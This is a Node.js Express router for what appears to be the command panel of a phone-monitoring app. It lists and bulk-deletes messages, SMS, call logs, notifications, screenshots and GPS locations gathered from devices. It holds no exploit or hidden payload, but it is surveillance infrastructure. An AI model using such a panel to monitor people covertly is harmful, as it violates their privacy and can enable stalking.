const express = require('express');
const router = express.Router();
const Message = require('../models/Message');
const Location = require('../models/Location');
const Notification = require('../models/Notification');
const Sms = require('../models/Sms');
const CallLog = require('../models/CallLog');
const Screenshot = require('../models/Screenshot');
const { authenticate } = require('../middleware/auth');

// Global overview stats & recent data
router.get('/overview', authenticate, async (req, res, next) => {
  try {
    const [
      totalMessages,
      totalLocations,
      totalNotifications,
      totalSms,
      totalCallLogs,
      totalScreenshots,
      messageDevices,
      locationDevices,
    ] = await Promise.all([
      Message.countDocuments(),
      Location.countDocuments(),
      Notification.countDocuments(),
      Sms.countDocuments(),
      CallLog.countDocuments(),
      Screenshot.countDocuments(),
      Message.distinct('deviceId'),
      Location.distinct('deviceId'),
    ]);

    const uniqueDevices = Array.from(new Set([...messageDevices, ...locationDevices]));

    const [recentMessages, recentLocations] = await Promise.all([
      Message.find().sort({ createdAt: -1 }).limit(10).lean(),
      Location.find().sort({ capturedAt: -1 }).limit(20).lean(),
    ]);

    return res.status(200).json({
      success: true,
      stats: {
        totalDevices: uniqueDevices.length,
        totalMessages,
        totalLocations,
        totalNotifications,
        totalSms,
        totalCallLogs,
        totalScreenshots,
      },
      devices: uniqueDevices,
      recentMessages,
      recentLocations,
    });
  } catch (error) {
    next(error);
  }
});

// List all registered devices
router.get('/devices', authenticate, async (req, res, next) => {
  try {
    const [messageDevices, locationDevices] = await Promise.all([
      Message.distinct('deviceId'),
      Location.distinct('deviceId'),
    ]);

    const uniqueDevices = Array.from(new Set([...messageDevices, ...locationDevices]));

    const summaries = await Promise.all(
      uniqueDevices.map(async (deviceId) => {
        const [messageCount, locationCount, lastMessage, lastLocation] = await Promise.all([
          Message.countDocuments({ deviceId }),
          Location.countDocuments({ deviceId }),
          Message.findOne({ deviceId }).sort({ createdAt: -1 }).lean(),
          Location.findOne({ deviceId }).sort({ capturedAt: -1 }).lean(),
        ]);

        const lastActivity = [lastMessage?.createdAt, lastLocation?.capturedAt]
          .filter(Boolean)
          .sort((a, b) => new Date(b) - new Date(a))[0] || null;

        return {
          deviceId,
          messageCount,
          locationCount,
          lastActivity,
        };
      })
    );

    return res.status(200).json({
      success: true,
      count: summaries.length,
      devices: summaries,
    });
  } catch (error) {
    next(error);
  }
});

// ─── Locations ──────────────────────────────────────────────────────────────

router.get('/:deviceId/locations', authenticate, async (req, res, next) => {
  try {
    const { deviceId } = req.params;
    const limit = Math.min(parseInt(req.query.limit, 10) || 200, 1000);
    const filter = deviceId === 'all' ? {} : { deviceId };

    const locations = await Location.find(filter)
      .sort({ capturedAt: -1 })
      .limit(limit)
      .lean();

    return res.status(200).json({ success: true, deviceId, count: locations.length, locations });
  } catch (error) {
    next(error);
  }
});

router.delete('/:deviceId/locations', authenticate, async (req, res, next) => {
  try {
    const { deviceId } = req.params;
    if (!deviceId) return res.status(400).json({ error: 'Device ID is required.' });

    const filter = deviceId === 'all' ? {} : { deviceId };
    const result = await Location.deleteMany(filter);
    return res.status(200).json({
      success: true,
      deviceId,
      deletedCount: result.deletedCount || 0,
      message: `Deleted ${result.deletedCount || 0} location records.`,
    });
  } catch (error) {
    next(error);
  }
});

// ─── Messages ───────────────────────────────────────────────────────────────

router.get('/:deviceId/messages', authenticate, async (req, res, next) => {
  try {
    const { deviceId } = req.params;
    const limit = Math.min(parseInt(req.query.limit, 10) || 200, 1000);
    const filter = deviceId === 'all' ? {} : { deviceId };

    const messages = await Message.find(filter)
      .sort({ createdAt: -1 })
      .limit(limit)
      .lean();

    return res.status(200).json({ success: true, deviceId, count: messages.length, messages });
  } catch (error) {
    next(error);
  }
});

router.delete('/:deviceId/messages', authenticate, async (req, res, next) => {
  try {
    const { deviceId } = req.params;
    const filter = deviceId === 'all' ? {} : { deviceId };
    const result = await Message.deleteMany(filter);

    return res.status(200).json({ success: true, deviceId, deletedCount: result.deletedCount || 0 });
  } catch (error) {
    next(error);
  }
});

// ─── Notifications ──────────────────────────────────────────────────────────

router.get('/:deviceId/notifications', authenticate, async (req, res, next) => {
  try {
    const { deviceId } = req.params;
    const limit = Math.min(parseInt(req.query.limit, 10) || 200, 1000);
    const filter = deviceId === 'all' ? {} : { deviceId };

    const notifications = await Notification.find(filter)
      .sort({ timestamp: -1 })
      .limit(limit)
      .lean();

    return res.status(200).json({ success: true, deviceId, count: notifications.length, notifications });
  } catch (error) {
    next(error);
  }
});

router.delete('/:deviceId/notifications', authenticate, async (req, res, next) => {
  try {
    const { deviceId } = req.params;
    const filter = deviceId === 'all' ? {} : { deviceId };
    const result = await Notification.deleteMany(filter);

    return res.status(200).json({ success: true, deviceId, deletedCount: result.deletedCount || 0 });
  } catch (error) {
    next(error);
  }
});

// ─── SMS ────────────────────────────────────────────────────────────────────

router.get('/:deviceId/sms', authenticate, async (req, res, next) => {
  try {
    const { deviceId } = req.params;
    const limit = Math.min(parseInt(req.query.limit, 10) || 200, 1000);
    const filter = deviceId === 'all' ? {} : { deviceId };

    const smsList = await Sms.find(filter)
      .sort({ timestamp: -1 })
      .limit(limit)
      .lean();

    return res.status(200).json({ success: true, deviceId, count: smsList.length, sms: smsList });
  } catch (error) {
    next(error);
  }
});

router.delete('/:deviceId/sms', authenticate, async (req, res, next) => {
  try {
    const { deviceId } = req.params;
    const filter = deviceId === 'all' ? {} : { deviceId };
    const result = await Sms.deleteMany(filter);

    return res.status(200).json({ success: true, deviceId, deletedCount: result.deletedCount || 0 });
  } catch (error) {
    next(error);
  }
});

// ─── Call Logs ──────────────────────────────────────────────────────────────

router.get('/:deviceId/callLogs', authenticate, async (req, res, next) => {
  try {
    const { deviceId } = req.params;
    const limit = Math.min(parseInt(req.query.limit, 10) || 200, 1000);
    const filter = deviceId === 'all' ? {} : { deviceId };

    const callLogs = await CallLog.find(filter)
      .sort({ timestamp: -1 })
      .limit(limit)
      .lean();

    return res.status(200).json({ success: true, deviceId, count: callLogs.length, callLogs });
  } catch (error) {
    next(error);
  }
});

router.delete('/:deviceId/callLogs', authenticate, async (req, res, next) => {
  try {
    const { deviceId } = req.params;
    const filter = deviceId === 'all' ? {} : { deviceId };
    const result = await CallLog.deleteMany(filter);

    return res.status(200).json({ success: true, deviceId, deletedCount: result.deletedCount || 0 });
  } catch (error) {
    next(error);
  }
});

// ─── Screenshots ─────────────────────────────────────────────────────────────

router.get('/:deviceId/screenshots', authenticate, async (req, res, next) => {
  try {
    const { deviceId } = req.params;
    const limit = Math.min(parseInt(req.query.limit, 10) || 50, 200);
    const filter = deviceId === 'all' ? {} : { deviceId };

    const screenshots = await Screenshot.find(filter)
      .sort({ capturedAt: -1 })
      .limit(limit)
      .lean();

    return res.status(200).json({ success: true, deviceId, count: screenshots.length, screenshots });
  } catch (error) {
    next(error);
  }
});

router.delete('/:deviceId/screenshots', authenticate, async (req, res, next) => {
  try {
    const { deviceId } = req.params;
    const filter = deviceId === 'all' ? {} : { deviceId };
    const result = await Screenshot.deleteMany(filter);

    return res.status(200).json({ success: true, deviceId, deletedCount: result.deletedCount || 0 });
  } catch (error) {
    next(error);
  }
});

module.exports = router;
